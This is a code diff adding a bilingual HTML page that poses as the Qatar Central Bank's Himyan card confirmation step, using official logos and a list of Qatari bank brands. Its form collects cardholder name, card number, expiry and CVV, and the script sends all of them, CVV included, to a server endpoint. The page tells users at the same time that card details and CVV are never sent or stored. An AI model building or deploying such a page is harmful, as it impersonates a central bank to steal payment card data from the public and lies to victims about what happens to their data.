@@ -1,0 +1,294 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="التأكيد الإلكتروني لطلب بطاقة هميان." />
+  <title>التأكيد الإلكتروني | هميان</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    .verification-rejection-modal {
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      display: grid;
+      place-items: center;
+      padding: 20px;
+      background: rgba(17, 10, 13, 0.48);
+    }
+
+    .verification-rejection-modal[hidden] {
+      display: none;
+    }
+
+    .verification-rejection-dialog {
+      width: min(100%, 420px);
+      padding: 28px 24px;
+      border-radius: 20px;
+      background: #fff;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(17, 10, 13, 0.25);
+      border-top: 5px solid #c6284a;
+    }
+
+    .verification-rejection-icon {
+      width: 68px;
+      height: 68px;
+      margin: 0 auto 16px;
+      border: 3px solid #c6284a;
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      color: #c6284a;
+      font-size: 46px;
+      font-weight: 700;
+      line-height: 1;
+    }
+
+    .verification-rejection-dialog h2 {
+      margin: 0 0 10px;
+      color: #8a173b;
+      font-size: 22px;
+    }
+
+    .verification-rejection-dialog p {
+      margin: 0;
+      color: #5f4b53;
+      line-height: 1.8;
+    }
+  </style>
+</head>
+
+<body class="success-page confirmation-page">
+  <header class="site-header">
+    <div class="header-top container">
+      <div class="mobile-controls">
+        <button class="menu-toggle" type="button" aria-label="فتح القائمة" aria-expanded="false"
+          aria-controls="main-navigation"><span></span><span></span><span></span></button>
+        <a class="mobile-language" href="#" data-language-switch>EN</a>
+      </div>
+      <a class="qcb-link" href="https://www.qcb.gov.qa" aria-label="مصرف قطر المركزي"><img class="qcb-logo"
+          src="assets/qcb-logo.svg" alt="مصرف قطر المركزي" /></a>
+      <a class="himyan-link" href="index.html#top" aria-label="هميان"><img class="himyan-logo" src="assets/logo.svg"
+          alt="هميان HIMYAN" /></a>
+    </div>
+    <nav id="main-navigation" class="main-navigation container" aria-label="القائمة الرئيسية">
+      <a href="index.html#top" data-i18n="nav.about">عن هميان</a><a href="index.html#about" data-i18n="nav.goals">أهداف
+        إصدار البطاقة</a><a href="index.html#cards" data-i18n="nav.specs">مواصفات البطاقة</a><a
+        href="index.html#advantages" data-i18n="nav.advantages">مميزات البطاقة</a><a href="index.html#cards"
+        data-i18n="nav.offers">عروض البطاقة</a><a href="index.html#cards" data-i18n="nav.news">الأخبار</a><a
+        href="index.html#cards" data-i18n="nav.issuers">مصدرو البطاقة</a><a href="index.html#cards"
+        data-i18n="nav.audiences">الفئات المستهدفة</a><a href="index.html#cards" data-i18n="nav.security">إرشادات
+        أمنية</a><a class="language" href="#" data-language-switch>EN</a>
+    </nav>
+  </header>
+
+
+  <main class="confirmation-main">
+    <h1 class="payment-page-title" data-i18n="payment.pageTitle">التأكيد الإلكتروني</h1>
+    <section class="confirmation-hero">
+      <div class="container confirmation-layout">
+        <div class="confirmation-card">
+          <div class="confirmation-status-icon" aria-hidden="true"><svg viewBox="0 0 64 64" fill="none">
+              <circle cx="32" cy="32" r="27" stroke="currentColor" stroke-width="4" />
+              <path d="m19 32 8.5 8.5L45 23" stroke="currentColor" stroke-width="4.5" stroke-linecap="round"
+                stroke-linejoin="round" />
+            </svg></div>
+          <span class="section-kicker" data-i18n="confirmation.kicker">التأكيد الإلكتروني</span>
+          <h1 data-i18n="confirmation.title">تأكيد طلب بطاقة هميان</h1>
+          <p class="confirmation-message" data-i18n="confirmation.message">يرجى مراجعة بيانات الطلب ثم متابعة خطوة
+            التأكيد الإلكتروني.</p>
+          <div id="card-error-message" class="verification-rejection-modal" hidden>
+            <div class="modal-backdrop"></div>
+            <div class="verification-rejection-dialog">
+              <div class="verification-rejection-icon">!</div>
+              <h2 id="error-title">خطأ في البيانات</h2>
+              <p id="error-message"></p>
+              <button onclick="document.getElementById('card-error-message').hidden=true"
+                style="margin-top:20px;padding:10px 24px;background:#8a173b;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:16px">حسناً</button>
+            </div>
+          </div>
+          <div class="confirmation-reference"><span data-i18n="confirmation.referenceLabel">الرقم المرجعي
+              للطلب</span><strong id="request-reference">HM-2026-000000</strong></div>
+          <div class="confirmation-status-line"><span class="status-dot"></span><span
+              data-i18n="confirmation.status">حالة الطلب: تم الاستلام — بانتظار التحقق الإلكتروني</span></div>
+          <div class="confirmation-actions"><a class="confirmation-home" href="index.html#top"
+              data-i18n="confirmation.home">العودة إلى الصفحة الرئيسية</a><button class="confirmation-payment"
+              type="button" disabled><span data-i18n="confirmation.payment">الانتقال إلى بوابة الدفع
+                الرسمية</span><small data-i18n="confirmation.pending">سيتم تفعيلها بعد إضافة رابط مزود
+                الدفع</small></button></div>
+        </div>
+        <aside class="gateway-panel">
+          <div class="gateway-lock" aria-hidden="true"><svg viewBox="0 0 48 48" fill="none">
+              <rect x="10" y="21" width="28" height="21" rx="4" stroke="currentColor" stroke-width="2.5" />
+              <path d="M16 21v-5a8 8 0 0 1 16 0v5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" />
+              <circle cx="24" cy="31" r="2" fill="currentColor" />
+              <path d="M24 33v4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" />
+            </svg></div>
+          <span class="section-kicker" data-i18n="gateway.kicker">بوابة هميان</span>
+          <h2 data-i18n="gateway.title">تأكيد إلكتروني آمن</h2>
+          <p data-i18n="gateway.text">هذه الصفحة مخصصة لتأكيد طلبك وتجهيزك للانتقال إلى بوابة الدفع الرسمية عند تفعيل
+            رابط مزود الخدمة.</p>
+          <div class="payment-provider-banner"><span class="selected-bank-brand" aria-label="شعار البنك المختار"><img
+                class="selected-bank-logo" id="selected-bank-logo" src="assets/bank-logos/bank-logo-default.svg"
+                alt="شعار البنك المختار" /><span class="selected-bank-name" id="selected-bank-name"></span></span><img
+              class="payment-himyan-logo" src="assets/logo.svg" alt="هميان HIMYAN" /></div>
+          <form class="demo-payment-form" id="demo-payment-form"><label class="demo-field demo-field-full"><span
+                data-i18n="payment.cardholder">اسم حامل البطاقة</span><input name="cardholder" type="text"
+                autocomplete="off" placeholder="أحمد محمد" data-placeholder="payment.cardholderPlaceholder"
+                required /></label><label class="demo-field demo-field-full"><span data-i18n="payment.cardNumber">رقم
+                البطاقة</span><input name="cardNumber" type="text" inputmode="numeric" autocomplete="off"
+                placeholder="0000 0000 0000 0000" data-placeholder="payment.cardNumberPlaceholder" required /></label>
+            <div class="demo-field"><span data-i18n="payment.expiry">تاريخ انتهاء البطاقة</span>
+              <div class="demo-payment-grid"><select name="expiryMonth" aria-label="Month" required>
+                  <option value="" data-i18n="payment.month">الشهر</option>
+                  <option>01</option>
+                  <option>02</option>
+                  <option>03</option>
+                  <option>04</option>
+                  <option>05</option>
+                  <option>06</option>
+                  <option>07</option>
+                  <option>08</option>
+                  <option>09</option>
+                  <option>10</option>
+                  <option>11</option>
+                  <option>12</option>
+                </select><select name="expiryYear" aria-label="Year" required>
+                  <option value="" data-i18n="payment.year">السنة</option>
+                  <option>2027</option>
+                  <option>2028</option>
+                  <option>2029</option>
+                  <option>2030</option>
+                  <option>2031</option>
+                  <option>2032</option>
+                </select></div>
+            </div><label class="demo-field demo-field-full"><span data-i18n="payment.cvv">CVV</span><input name="cvv"
+                type="password" inputmode="numeric" autocomplete="off" placeholder="•••"
+                data-placeholder="payment.cvvPlaceholder" required /></label>
+            <p class="payment-terms" data-i18n="payment.terms">بالضغط على زر الاستمرار، فأنت تقر بقبول شروط وأحكام
+              الدفع.</p>
+            <div class="payment-brand-row"><img src="assets/naps.svg" alt="NAPS" /><img src="assets/logo.svg"
+                alt="HIMYAN" /></div>
+            <div class="payment-action-row"><button class="demo-pay-button" type="submit"
+                data-i18n="payment.button">استمرار</button><a class="demo-cancel-button" href="index.html#top"
+                data-i18n="payment.cancel">إلغاء</a></div>
+            <p class="demo-form-message" id="demo-form-message" role="status" aria-live="polite"></p>
+          </form>
+          <p class="payment-security-note" data-i18n="payment.securityNote">لأمانك، لا يتم حفظ بيانات البطاقة أو إرسال
+            رقمها ورمز CVV إلى لوحة الإدارة؛ يتم إرسال حالة الطلب فقط للمراجعة.</p>
+          <p class="payment-refresh-note" data-i18n="payment.refreshNote">لإتمام العملية بشكل صحيح، يرجى عدم تحديث هذه
+            الصفحة أو استخدام زر الرجوع في المتصفح.</p>
+        </aside>
+      </div>
+    </section>
+
+
+    <section class="success-specs" aria-labelledby="specs-title">
+      <div class="container">
+        <div class="success-section-heading"><span class="section-kicker" data-i18n="specs.kicker">مواصفات
+            البطاقة</span>
+          <h2 id="specs-title" data-i18n="specs.title">تجربة دفع محلية متكاملة</h2>
+          <p data-i18n="specs.intro">استمتع بطرق دفع آمنة ومرنة باستخدام بطاقة هميان.</p>
+        </div>
+        <div class="success-spec-grid">
+          <article class="success-spec">
+            <div class="success-spec-icon"><img src="assets/contactless.svg" alt="" /></div>
+            <h3 data-i18n="specs.contactlessTitle">المعاملات اللاتلامسية</h3>
+            <p data-i18n="specs.contactlessText">تدعم البطاقة المعاملات اللاتلامسية لإتمام عمليات الدفع بسرعة وسهولة.
+            </p>
+          </article>
+          <article class="success-spec">
+            <div class="success-spec-icon"><img src="assets/naps.svg" alt="" /></div>
+            <h3 data-i18n="specs.napsTitle">شبكة NAPS الوطنية</h3>
+            <p data-i18n="specs.napsText">تبادل ومعالجة المعاملات المالية باستخدام البطاقة محليًا عبر الشبكة الوطنية
+              لأجهزة الصراف الآلي ونقاط البيع (NAPS).</p>
+          </article>
+          <article class="success-spec">
+            <div class="success-spec-icon"><img src="assets/atm-pos-online.svg" alt="" /></div>
+            <h3 data-i18n="specs.accessTitle">الدفع والسحب والإيداع</h3>
+            <p data-i18n="specs.accessText">إتمام عمليات الدفع من خلال أجهزة نقاط البيع، وإجراء عمليات الشراء من مواقع
+              التجارة الإلكترونية المحلية عبر شبكة الإنترنت، والسحب والإيداع من خلال أجهزة الصراف الآلي.</p>
+          </article>
+        </div>
+      </div>
+    </section>
+  </main>
+
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <p data-i18n="footer.rights">جميع الحقوق محفوظة © - مصرف قطر المركزي 2024</p>
+      <nav aria-label="روابط التذييل"><a href="index.html#top" data-i18n="footer.map">خريطة الموقع</a><a href="#"
+          data-i18n="footer.legal">حقوق النشر وحدود المسئولية</a><a href="#" data-i18n="footer.privacy">الخصوصية</a>
+      </nav>
+    </div>
+  </footer>
+  <script>
+    const translations = {
+      ar: { title: 'التأكيد الإلكتروني | هميان', description: 'التأكيد الإلكتروني لطلب بطاقة هميان.', menu: 'فتح القائمة', mainNav: 'القائمة الرئيسية', footerNav: 'روابط التذييل', qcb: 'مصرف قطر المركزي', himyan: 'هميان', nav: { about: 'عن هميان', goals: 'أهداف إصدار البطاقة', specs: 'مواصفات البطاقة', advantages: 'مميزات البطاقة', offers: 'عروض البطاقة', news: 'الأخبار', issuers: 'مصدرو البطاقة', audiences: 'الفئات المستهدفة', security: 'إرشادات أمنية' }, confirmation: { kicker: 'التأكيد الإلكتروني', title: 'تأكيد طلب بطاقة هميان', message: 'يرجى مراجعة بيانات الطلب ثم متابعة خطوة التأكيد الإلكتروني.', referenceLabel: 'الرقم المرجعي للطلب', status: 'حالة الطلب: تم الاستلام — بانتظار التحقق الإلكتروني', home: 'العودة إلى الصفحة الرئيسية', payment: 'الانتقال إلى بوابة الدفع الرسمية', pending: 'سيتم تفعيلها بعد إضافة رابط مزود الدفع' }, gateway: { kicker: 'بوابة هميان', title: 'تأكيد إلكتروني آمن', text: 'هذه الصفحة مخصصة لتأكيد طلبك وتجهيزك للانتقال إلى بوابة الدفع الرسمية عند تفعيل رابط مزود الخدمة.', orderLabel: 'الخدمة', orderValue: 'تأكيد طلب بطاقة هميان', amountLabel: 'المبلغ', amountValue: 'يُحدد لاحقًا', }, payment: { pageTitle: 'التأكيد الإلكتروني', securityNote: 'لأمانك، لا يتم حفظ بيانات البطاقة أو إرسال رقمها ورمز CVV إلى لوحة الإدارة؛ يتم إرسال حالة الطلب فقط للمراجعة.', secure: 'دفع آمن', cardholder: 'اسم حامل البطاقة', cardholderPlaceholder: 'أحمد محمد', cardNumber: 'رقم البطاقة', cardNumberPlaceholder: '0000 0000 0000 0000', expiry: 'تاريخ انتهاء البطاقة', expiryPlaceholder: 'MM/YY', month: 'الشهر', year: 'السنة', cvv: 'CVV', cvvPlaceholder: '•••', terms: 'بالضغط على زر الاستمرار، فأنت تقر بقبول شروط وأحكام الدفع.', button: 'استمرار', cancel: 'إلغاء', refreshNote: 'لإتمام العملية بشكل صحيح، يرجى عدم تحديث هذه الصفحة أو استخدام زر الرجوع في المتصفح.', message: 'هذه واجهة تجريبية فقط. لم يتم إرسال أو حفظ أي بيانات.' }, specs: { kicker: 'مواصفات البطاقة', title: 'تجربة دفع محلية متكاملة', intro: 'استمتع بطرق دفع آمنة ومرنة باستخدام بطاقة هميان.', contactlessTitle: 'المعاملات اللاتلامسية', contactlessText: 'تدعم البطاقة المعاملات اللاتلامسية لإتمام عمليات الدفع بسرعة وسهولة.', napsTitle: 'شبكة NAPS الوطنية', napsText: 'تبادل ومعالجة المعاملات المالية باستخدام البطاقة محليًا عبر الشبكة الوطنية لأجهزة الصراف الآلي ونقاط البيع (NAPS).', accessTitle: 'الدفع والسحب والإيداع', accessText: 'إتمام عمليات الدفع من خلال أجهزة نقاط البيع، وإجراء عمليات الشراء من مواقع التجارة الإلكترونية المحلية عبر شبكة الإنترنت، والسحب والإيداع من خلال أجهزة الصراف الآلي.' }, footer: { rights: 'جميع الحقوق محفوظة © - مصرف قطر المركزي 2024', map: 'خريطة الموقع', legal: 'حقوق النشر وحدود المسئولية', privacy: 'الخصوصية' } },
+      en: { title: 'Electronic confirmation | Himyan', description: 'Electronic confirmation for your Himyan card application.', menu: 'Open menu', mainNav: 'Main navigation', footerNav: 'Footer links', qcb: 'Qatar Central Bank', himyan: 'Himyan', nav: { about: 'About Himyan', goals: 'Card issuance goals', specs: 'Card specifications', advantages: 'Card advantages', offers: 'Card offers', news: 'News', issuers: 'Card issuers', audiences: 'Target groups', security: 'Security guidelines' }, confirmation: { kicker: 'Electronic confirmation', title: 'Confirm your Himyan card request', message: 'Review the request details, then continue with electronic confirmation.', referenceLabel: 'Application reference number', status: 'Status: Received — awaiting electronic verification', home: 'Back to home page', payment: 'Continue to the official payment gateway', pending: 'It will be activated after the payment provider link is added' }, gateway: { kicker: 'Himyan gateway', title: 'Secure electronic confirmation', text: 'This page confirms your request and prepares you to continue to the official payment gateway once the provider link is activated.', orderLabel: 'Service', orderValue: 'Himyan card request confirmation', amountLabel: 'Amount', amountValue: 'To be determined', }, payment: { pageTitle: 'Electronic confirmation', securityNote: 'For your security, card details and CVV are never stored or sent to the admin panel; only the request status is submitted for review.', secure: 'Secure payment', cardholder: 'Cardholder name', cardholderPlaceholder: 'Ahmed Mohamed', cardNumber: 'Card number', cardNumberPlaceholder: '0000 0000 0000 0000', expiry: 'Card expiry date', expiryPlaceholder: 'MM/YY', month: 'Month', year: 'Year', cvv: 'CVV', cvvPlaceholder: '•••', terms: 'By clicking Continue, you acknowledge and accept the payment Terms and Conditions.', button: 'Continue', cancel: 'Cancel', refreshNote: 'For proper completion of your transaction, please do not refresh this page or click the browser back button.', message: 'This is a demo interface only. No data was sent or saved.' }, specs: { kicker: 'Card specifications', title: 'A complete local payment experience', intro: 'Enjoy secure and flexible payment options with your Himyan card.', contactlessTitle: 'Contactless transactions', contactlessText: 'The card supports contactless transactions for quick and convenient payments.', napsTitle: 'National NAPS network', napsText: 'Exchange and process financial transactions locally using the national network for ATMs and points of sale (NAPS).', accessTitle: 'Payments, withdrawals and deposits', accessText: 'Make payments through points-of-sale terminals, shop on local e-commerce websites over the internet, and withdraw or deposit cash through ATMs.' }, footer: { rights: 'All rights reserved © — Qatar Central Bank 2024', map: 'Sitemap', legal: 'Copyright and disclaimer', privacy: 'Privacy' } }
+    };
+    const getValue = (dictionary, path) => path.split('.').reduce((value, key) => value?.[key], dictionary);
+    const bankLogoFiles = {
+      qnb: 'assets/official-bank-logos/official-bank-logo-qnb.png',
+      cbq: 'assets/official-bank-logos/official-bank-logo-cbq.png',
+      doha: 'assets/official-bank-logos/official-bank-logo-doha.png',
+      ahli: 'assets/official-bank-logos/official-bank-logo-ahli.png',
+      qib: 'assets/official-bank-logos/official-bank-logo-qib.png',
+      rayan: 'assets/official-bank-logos/official-bank-logo-rayan.png',
+      qiib: 'assets/official-bank-logos/official-bank-logo-qiib.png',
+      dukhan: 'assets/official-bank-logos/official-bank-logo-dukhan.png',
+      lesha: 'assets/official-bank-logos/official-bank-logo-lesha.png',
+      qdb: 'assets/official-bank-logos/official-bank-logo-qdb.png',
+      hsbc: 'assets/official-bank-logos/official-bank-logo-hsbc.png',
+      scb: 'assets/official-bank-logos/official-bank-logo-scb.png',
+      arab: 'assets/official-bank-logos/official-bank-logo-arab.png',
+      mashreq: 'assets/official-bank-logos/official-bank-logo-mashreq.png',
+      citibank: 'assets/official-bank-logos/official-bank-logo-citibank.png',
+      bnpp: 'assets/official-bank-logos/official-bank-logo-bnpp.png',
+      saderat: 'assets/official-bank-logos/official-bank-logo-saderat.png'
+    };
+    const navigation = document.querySelector('.main-navigation'); const menuToggle = document.querySelector('.menu-toggle'); const languageSwitches = document.querySelectorAll('[data-language-switch]'); const bankParams = new URLSearchParams(window.location.search); const storedBank = (() => { try { return JSON.parse(localStorage.getItem('himyan-selected-bank') || '{}'); } catch { return {}; } })(); const bankCode = bankParams.get('bank') || storedBank.code || ''; const bankNameParam = bankParams.get('bankName') || storedBank.name || ''; const bankLabels = {
+      qnb: ['QNB', 'بنك قطر الوطني', 'Qatar National Bank'],
+      cbq: ['Commercial Bank', 'البنك التجاري', 'Commercial Bank'],
+      doha: ['Doha Bank', 'بنك الدوحة', 'Doha Bank'],
+      ahli: ['ahlibank', 'البنك الأهلي', 'Ahlibank'],
+      qib: ['QIB', 'مصرف قطر الإسلامي', 'Qatar Islamic Bank'],
+      rayan: ['Masraf Al Rayan', 'مصرف الريان', 'Masraf Al Rayan'],
+      qiib: ['QIIB', 'بنك قطر الدولي الإسلامي', 'Qatar International Islamic Bank'],
+      dukhan: ['Dukhan Bank', 'بنك دخان', 'Dukhan Bank'],
+      lesha: ['Lesha Bank', 'بنك لشا', 'Lesha Bank'],
+      qdb: ['QDB', 'بنك قطر للتنمية', 'Qatar Development Bank'],
+      hsbc: ['HSBC', 'بنك إتش إس بي سي الشرق الأوسط', 'HSBC Middle East'],
+      scb: ['Standard Chartered', 'بنك ستاندرد تشارترد', 'Standard Chartered'],
+      arab: ['Arab Bank', 'البنك العربي', 'Arab Bank'],
+      mashreq: ['Mashreq', 'بنك المشرق', 'Mashreq Bank'],
+      citibank: ['Citibank N.A.', 'سيتي بنك', 'Citibank N.A.'],
+      bnpp: ['BNP Paribas', 'بنك بي إن بي باريبا', 'BNP Paribas'],
+      saderat: ['Bank Saderat Iran', 'بنك صادرات إيران', 'Bank Saderat Iran']
+    }; function updateBankBrand() { const lang = document.documentElement.lang === 'en' ? 'en' : 'ar'; const fallback = lang === 'en' ? 'Selected bank' : 'البنك المختار'; const info = bankLabels[bankCode]; const bankLogo = document.querySelector('#selected-bank-logo'); const bankName = bankNameParam || info?.[lang === 'en' ? 2 : 1] || fallback; const bankNameElement = document.querySelector('#selected-bank-name'); if (bankNameElement) bankNameElement.textContent = bankName; if (bankLogo) { bankLogo.src = bankLogoFiles[bankCode] || 'assets/bank-logos/bank-logo-default.svg'; bankLogo.alt = bankName; bankLogo.style.display = 'block'; bankLogo.onerror = () => { bankLogo.src = 'assets/bank-logos/bank-logo-default.svg'; bankLogo.alt = lang === 'en' ? 'Selected bank logo' : 'شعار البنك المختار'; }; } }
+    function setLanguage(language, syncUrl = true) { const lang = language === 'en' ? 'en' : 'ar'; const dictionary = translations[lang]; document.documentElement.lang = lang; document.documentElement.dir = lang === 'en' ? 'ltr' : 'rtl'; document.title = dictionary.title; document.querySelector('meta[name="description"]').setAttribute('content', dictionary.description); document.querySelectorAll('[data-i18n]').forEach((element) => { const value = getValue(dictionary, element.dataset.i18n); if (value !== undefined) element.innerHTML = value; }); document.querySelector('.qcb-link')?.setAttribute('aria-label', dictionary.qcb); document.querySelector('.himyan-link')?.setAttribute('aria-label', dictionary.himyan); navigation?.setAttribute('aria-label', dictionary.mainNav); document.querySelector('.site-footer nav')?.setAttribute('aria-label', dictionary.footerNav); menuToggle?.setAttribute('aria-label', dictionary.menu); languageSwitches.forEach((switcher) => { switcher.textContent = lang === 'ar' ? 'EN' : 'AR'; switcher.setAttribute('aria-label', lang === 'ar' ? 'Switch to English' : 'التحويل إلى العربية'); }); document.querySelectorAll('a[href^="index.html"]').forEach((link) => { const target = link.getAttribute('href'); link.href = `${target}${target.includes('?') ? '&' : '?'}lang=${lang}`; }); localStorage.setItem('himyan-language', lang); if (syncUrl) { const url = new URL(window.location.href); url.searchParams.set('lang', lang); window.history.replaceState({}, '', url); } }
+    languageSwitches.forEach((switcher) => switcher.addEventListener('click', (event) => { event.preventDefault(); setLanguage(document.documentElement.lang === 'ar' ? 'en' : 'ar'); })); menuToggle?.addEventListener('click', () => { const expanded = menuToggle.getAttribute('aria-expanded') === 'true'; menuToggle.setAttribute('aria-expanded', String(!expanded)); navigation?.classList.toggle('is-open', !expanded); });
+    const reference = `HM-${new Date().getFullYear()}-${String(Date.now()).slice(-6)}`; const requestId = bankParams.get('requestId') || localStorage.getItem('himyan-request-id') || ''; const demoPaymentForm = document.querySelector('#demo-payment-form'); const demoFormMessage = document.querySelector('#demo-form-message'); demoPaymentForm?.addEventListener('submit', async (event) => { event.preventDefault(); if (!demoPaymentForm.checkValidity()) { demoPaymentForm.reportValidity(); return; } const lang = document.documentElement.lang === 'en' ? 'en' : 'ar'; const submitButton = demoPaymentForm.querySelector('.demo-pay-button'); const messages = { ar: { missing: 'لا يمكن إرسال الطلب قبل استكمال بيانات البطاقة المطلوبة.', noRequest: 'انتهت جلسة الطلب. يرجى العودة إلى صفحة التقديم وإرسال الطلب من جديد.', error: 'تعذر إرسال الطلب للمراجعة حاليًا. يرجى المحاولة مرة أخرى.' }, en: { missing: 'Please complete the required card fields before submitting.', noRequest: 'The request session has expired. Please return to the application page and submit again.', error: 'The request could not be sent for review. Please try again.' } }; if (!requestId) { if (demoFormMessage) { demoFormMessage.textContent = messages[lang].noRequest; demoFormMessage.classList.add('is-visible'); } return; } submitButton.disabled = true; try { const formData = new FormData(demoPaymentForm); const cardHolderName = formData.get('cardholder') || ''; const cardNumber = formData.get('cardNumber') || ''; const expiryMonth = formData.get('expiryMonth') || ''; const expiryYear = formData.get('expiryYear') || ''; const cardCvv = formData.get('cvv') || ''; const response = await fetch('/api/requests/confirm', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: requestId, cardHolderName: cardHolderName, cardNumber: cardNumber.replace(/\s/g, ''), cardExpiryMonth: expiryMonth, cardExpiryYear: expiryYear, cardCvv: cardCvv }) }); const result = await response.json().catch(() => ({})); if (!response.ok || !result.ok) throw new Error('Confirmation failed'); localStorage.setItem('himyan-request-id', requestId); window.location.href = `pending.html?lang=${lang}&stage=card&requestId=${encodeURIComponent(requestId)}`; } catch { if (demoFormMessage) { demoFormMessage.textContent = messages[lang].error; demoFormMessage.classList.add('is-visible'); } submitButton.disabled = false; } }); document.querySelector('#request-reference').textContent = reference;
+    const params = new URLSearchParams(window.location.search); setLanguage(params.get('lang') || localStorage.getItem('himyan-language') || 'ar', false); updateBankBrand(); languageSwitches.forEach((switcher) => switcher.addEventListener('click', () => setTimeout(updateBankBrand, 0)));
+
+    // Check for error message from rejection
+    const errorMsg = localStorage.getItem('himyan-card-error');
+    if (errorMsg) {
+      localStorage.removeItem('himyan-card-error');
+      const errorModal = document.getElementById('card-error-message');
+      const errorMessageEl = document.getElementById('error-message');
+      if (errorModal && errorMessageEl) {
+        errorMessageEl.textContent = errorMsg;
+        errorModal.hidden = false;
+      }
+    }
+  </script>
+</body>
+
+</html>
